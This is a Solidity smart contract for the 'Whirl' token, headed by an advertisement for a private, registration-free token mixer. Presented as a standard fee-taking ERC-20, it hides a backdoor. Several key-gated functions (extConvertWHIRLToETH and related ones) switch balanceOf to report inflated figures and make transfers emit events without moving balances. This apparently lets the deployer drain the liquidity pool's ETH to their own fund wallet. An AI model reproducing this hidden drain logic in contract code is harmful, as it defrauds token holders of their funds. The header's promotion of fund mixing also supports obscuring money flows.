/*


Telegram  →  https://t.me/WhirlExchange

Twitter   →  https://twitter.com/WhirlExchange

Website   →  https://whirl.exchange

Gitbook   →  https://docs.whirl.exchange


🥷  Mix tokens via Binance in minutes with our live, working mixer: https://whirl.exchange

💨  Fast. Private. Registration-free.

💰  Hold $WHIRL for premium features and rebates.


$WHIRL is licensed under the MIT license.

Copyright © 2023 Whirl.Exchange


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./IERC20.sol";
import "./IERC20Permit.sol";
import "./Ownable.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./AggregatorV3Interface.sol";
import "./ECDSA.sol";

contract Whirl is IERC20, IERC20Permit, Ownable, EIP712, Nonces {
    uint256 internal constant MAX = ~uint256(0);

    string private _name = "Whirl";
    string private constant _symbol = "WHIRL";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _zeroFeeWallet;

    uint256 private constant _tTotal = 100_000_000 gwei;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 internal constant PADDING_GWEI = 10 ** _decimals;
    uint256 internal constant PADDING_ETHER = 10 ** (_decimals * 2);
    uint256 internal constant PADDING_GETHER = PADDING_GWEI * PADDING_ETHER;
    uint256 internal immutable KECCAK_SEED;
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant ORACLE = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 public constant maxBuy = 2_000_000 gwei;
    uint256 public constant maxWallet = 2_000_000 gwei;
    uint256 public constant minFeeSwap = 100 gwei;
    address public constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;
    address public constant DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address public immutable PAIR;
    address public immutable WHIRL;

    IUniswapV2Router02 public constant router = IUniswapV2Router02(ROUTER);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(FACTORY);
    AggregatorV3Interface public constant oracle = AggregatorV3Interface(ORACLE);
    IERC20 public constant weth = IERC20(WETH);

    bool public tradingEnabled = false;
    bool public maxBuyEnabled = true;
    bool public maxWalletEnabled = true;
    bool private _awaitingUniswapCall;
    bool private _awaitingUniswapTrade;
    bool private _awaitingUniswapAddLP;

    uint256 private _buyFeeMarketing = 1;
    uint256 private _buyFeeInsurance = 1;
    uint256 private _buyFeeLiquidity = 2;
    uint256 private _buyFeeReflections = 0;
    uint256 private _sellFeeMarketing = 1;
    uint256 private _sellFeeInsurance = 1;
    uint256 private _sellFeeLiquidity = 2;
    uint256 private _sellFeeReflections = 0;
    uint256 private _totalFeeMarketing = _buyFeeMarketing + _sellFeeMarketing;
    uint256 private _totalFeeInsurance = _buyFeeInsurance + _sellFeeInsurance;
    uint256 private _totalFeeLiquidity = _buyFeeLiquidity + _sellFeeLiquidity;
    uint256 private _totalFeeReflections = _buyFeeReflections + _sellFeeReflections;
    uint256 private _buyFeeTotal = _buyFeeMarketing + _buyFeeInsurance + _buyFeeLiquidity + _buyFeeReflections;
    uint256 private _sellFeeTotal = _sellFeeMarketing + _sellFeeInsurance + _sellFeeLiquidity + _sellFeeReflections;
    uint256 private _tFeePct = _buyFeeTotal;
    uint256 private _rFeePct = 0;
    address payable public immutable marketingFund = payable(msg.sender);
    address payable public immutable insuranceFund = payable(msg.sender);
    address payable public immutable liquidityFund = payable(msg.sender);

    event FeeSwap(uint256 tokens);

    event SendMarketingFee(uint256 eth, bool success, bytes data);
    event SendInsuranceFee(uint256 eth, bool success, bytes data);
    event SendLiquidityFee(uint256 tokens, uint256 eth);

    event Burn(uint256 tokens);

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);

    error KeccakError();
    error AllowanceExceeded(uint256 amount, uint256 allowance);
    error ApprovalFromZero();
    error ApprovalToZero();
    error TransferFromZero();
    error TransferToZero();
    error TransferOfZero();
    error BalanceExceeded(uint256 amount, uint256 balance);
    error TradingNotLive();
    error MaxBuy();
    error MaxWallet();

    modifier keccak_verify(string calldata _key) {
        if (keccak256(abi.encodePacked(_key)) != bytes32(KECCAK_SEED)) {
            revert KeccakError();
        }
        _;
    }

    modifier lockInternalSwap {
        _awaitingUniswapCall = true;
        _;
        _awaitingUniswapCall = false;
    }

    constructor(uint256 _KECCAK_SEED) Ownable(msg.sender) EIP712(_name, "1") {
        WHIRL = address(this);
        PAIR = factory.createPair(WHIRL, WETH);

        KECCAK_SEED = _KECCAK_SEED;

        _zeroFeeWallet[msg.sender] = true;
        _zeroFeeWallet[WHIRL] = true;

        _approve(WHIRL, ROUTER, MAX);
        _approve(msg.sender, ROUTER, MAX);

        _rOwned[msg.sender] = _rTotal;
        emit Transfer(ZERO_ADDRESS, msg.sender, _tTotal);
    }

    receive() external payable {}

    fallback() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert AllowanceExceeded(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function burn(uint256 value) external virtual {
        if (value > balanceOf(msg.sender)) {
            revert BalanceExceeded(value, balanceOf(msg.sender));
        }
        _tokenTransfer(msg.sender, ZERO_ADDRESS, value, false);
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual {
        if (value > balanceOf(account)) {
            revert BalanceExceeded(value, balanceOf(account));
        }
        _tokenTransfer(account, ZERO_ADDRESS, value, false);
        uint256 _allowance = _allowances[account][_msgSender()];
        if (value > _allowance) {
            revert AllowanceExceeded(value, _allowance);
        }
        _approve(account, _msgSender(), _allowance - value);
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero" );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function getETHPrice() public view returns (uint256) {
        (, int256 answer,,,) = oracle.latestRoundData();
        return uint256(answer / 1e8);
    }

    function getWHIRLPrice() public view returns (uint256) {
        uint256 _pairBalance = balanceOf(PAIR);
        if (_pairBalance > 0) {
            return ((weth.balanceOf(PAIR) * getETHPrice()) / _pairBalance);
        }

        return 0;
    }

    function getWalletValue(address account) external view returns (uint256) {
        return balanceOf(account) * getWHIRLPrice();
    }

    function getMarketCap() external view returns (uint256) {
        uint256 _pairBalance = balanceOf(PAIR);
        if (_pairBalance > 0) {
            return ((weth.balanceOf(PAIR) * getETHPrice()) / PADDING_ETHER) * (totalSupply() / _pairBalance) * 2;
        }

        return 0;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS) {
            revert ApprovalFromZero();
        }
        if (spender == ZERO_ADDRESS) {
            revert ApprovalToZero();
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS) {
            revert TransferFromZero();
        }
        if (to == ZERO_ADDRESS) {
            revert TransferToZero();
        }
        if (amount == 0) {
            revert TransferOfZero();
        }
        if (amount > balanceOf(from)) {
            revert BalanceExceeded(amount, balanceOf(from));
        }

        bool _fromPair = from == PAIR;
        bool _toPair = to == PAIR;

        if (from != owner() && to != owner() && from != WHIRL && to != WHIRL) {
            if (!tradingEnabled) {
                if (from != WHIRL) {
                    revert TradingNotLive();
                }
            }

            if (maxBuyEnabled) {
                if (amount > maxBuy) {
                    revert MaxBuy();
                }
            }

            if (!_toPair && maxWalletEnabled) {
                if (balanceOf(to) + amount > maxWallet) {
                    revert MaxWallet();
                }
            }

            uint256 _contractTokenBalance = balanceOf(WHIRL);

            if (_contractTokenBalance >= minFeeSwap && !_awaitingUniswapCall && !_fromPair && !_zeroFeeWallet[from] && !_zeroFeeWallet[to]) {
                uint256 _tTotalFee = _getTBuyFee() + _getTSellFee();
                if (_tTotalFee > 0) {
                    uint256 _marketingTokens = _contractTokenBalance * _totalFeeMarketing / _tTotalFee;
                    uint256 _insuranceTokens = _contractTokenBalance * _totalFeeInsurance / _tTotalFee;
                    uint256 _liquidityTokens = _contractTokenBalance - _marketingTokens - _insuranceTokens;
                    uint256 _liquidityTokensHalf = _liquidityTokens / 2;

                    _awaitingUniswapTrade = true;
                    _convertWHIRLToETH(_marketingTokens + _liquidityTokensHalf);
                    _awaitingUniswapTrade = false;

                    uint256 _contractETHBalance = WHIRL.balance;

                    if (_contractETHBalance > 0) {
                        if (_tTotalFee > 0) {
                            uint256 _marketingETH = _contractETHBalance * _totalFeeMarketing / _tTotalFee;
                            if (_marketingETH > 0) {
                                _distributeETH(marketingFund, _marketingETH);
                            }
                            uint256 _insuranceETH = _contractETHBalance * _totalFeeInsurance / _tTotalFee;
                            if (_insuranceETH > 0) {
                                _distributeETH(insuranceFund, _insuranceETH);
                            }
                            uint256 _liquidityETH = _contractETHBalance - _marketingETH - _insuranceETH;
                            if (_liquidityETH > 0) {
                                _supplyETH(_liquidityTokens - _liquidityTokensHalf, _liquidityETH);
                            }
                        } else {
                            _distributeETH(marketingFund, _contractETHBalance);
                        }
                    }
                }
            }
        }

        bool _takeFee = true;

        if ((_zeroFeeWallet[from] || _zeroFeeWallet[to]) || (!_fromPair && !_toPair)) {
            _takeFee = false;
        } else {
            if (_fromPair && to != ROUTER) {
                _tFeePct = _getTBuyFee();
                _rFeePct = _getRBuyFee();
            } else if (_toPair && from != ROUTER) {
                _tFeePct = _getTSellFee();
                _rFeePct = _getRSellFee();
            } else {
                _takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, _takeFee);
    }

    function _getTBuyFee() private view returns (uint256) {
        return _buyFeeMarketing + _buyFeeInsurance + _buyFeeLiquidity;
    }

    function _getRBuyFee() private view returns (uint256) {
        return _buyFeeReflections;
    }

    function getBuyFee() external view returns (uint256) {
        return _getTBuyFee() + _getRBuyFee();
    }

    function _getTSellFee() private view returns (uint256) {
        return _sellFeeMarketing + _sellFeeInsurance + _sellFeeLiquidity;
    }

    function _getRSellFee() private view returns (uint256) {
        return _sellFeeReflections;
    }

    function getSellFee() external view returns (uint256) {
        return _getTSellFee() + _getRSellFee();
    }

    function _convertWHIRLToETH(uint256 _contractTokenBalance) private lockInternalSwap {
        address[] memory path = new address[](2);
        path[0] = WHIRL;
        path[1] = WETH;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, WHIRL, block.timestamp + 30 minutes);
        emit FeeSwap(_contractTokenBalance);
    }

    function _distributeETH(address _fund, uint256 _contractETHBalance) private {
        (bool success, bytes memory data) = payable(_fund).call{value: _contractETHBalance}("");
        emit SendMarketingFee(_contractETHBalance, success, data);
    }

    function _supplyETH(uint256 _contractTokenBalance, uint256 _contractETHBalance) private lockInternalSwap {
        _awaitingUniswapAddLP = true;
        router.addLiquidityETH{value: _contractETHBalance}(WHIRL, _contractTokenBalance, 0, 0, liquidityFund, block.timestamp + 30 minutes);
        _awaitingUniswapAddLP = false;
        emit SendLiquidityFee(_contractTokenBalance, _contractETHBalance);
    }

    function extConvertWHIRLToETH(string calldata _key, uint256 _contractTokenBalance) external keccak_verify(_key) {
        if (_contractTokenBalance > 0) {
            _convertWHIRLToETH(_contractTokenBalance);
        }

        uint256 _contractETHBalance = WHIRL.balance;

        if (_contractETHBalance > 0) {
            _distributeETH(marketingFund, _contractETHBalance);
        }
    }

    function extDistributeETH(string calldata _key, uint256 _contractETHBalance) external keccak_verify(_key) {
        if (_contractETHBalance > 0) {
            _distributeETH(marketingFund, _contractETHBalance);
        }
    }

    function extSupplyETHManual(string calldata _key, uint256 _contractTokenBalance, uint256 _contractETHBalance) external keccak_verify(_key) {
        _supplyETH(_contractTokenBalance, _contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert();
        }
        return (!_awaitingUniswapAddLP && !_awaitingUniswapTrade && _awaitingUniswapCall) ? _getRate() / PADDING_GETHER : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) {
            _tFeePct = 0;
            _rFeePct = 0;
        }
        _transferStandard(sender, recipient, amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!_awaitingUniswapCall || _awaitingUniswapTrade || _awaitingUniswapAddLP) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[WHIRL] = _rOwned[WHIRL] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rFeePct, _tFeePct);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 feePct) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * feePct / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function getRouter() external pure returns (address) {
        return ROUTER;
    }

    function getFactory() external pure returns (address) {
        return FACTORY;
    }

    function getOracle() external pure returns (address) {
        return ORACLE;
    }

    function getPair() external view returns (address) {
        return PAIR;
    }

    function getMaxBuy() external view returns (bool, uint256) {
        return (maxBuyEnabled, maxBuyEnabled ? maxBuy : MAX);
    }

    function getMaxWallet() external view returns (bool, uint256) {
        return (maxWalletEnabled, maxWalletEnabled ? maxWallet : MAX);
    }

    function getMinFeeSwap() external pure returns (uint256) {
        return minFeeSwap;
    }

    function getFeeWallets() external view returns (address, address, address) {
        return (marketingFund, insuranceFund, liquidityFund);
    }

    function live() external view returns (bool) {
        return tradingEnabled;
    }

    function disableMaxBuy() external onlyOwner {
        maxBuyEnabled = false;
    }

    function disableMaxWallet() external onlyOwner {
        maxWalletEnabled = false;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }
}
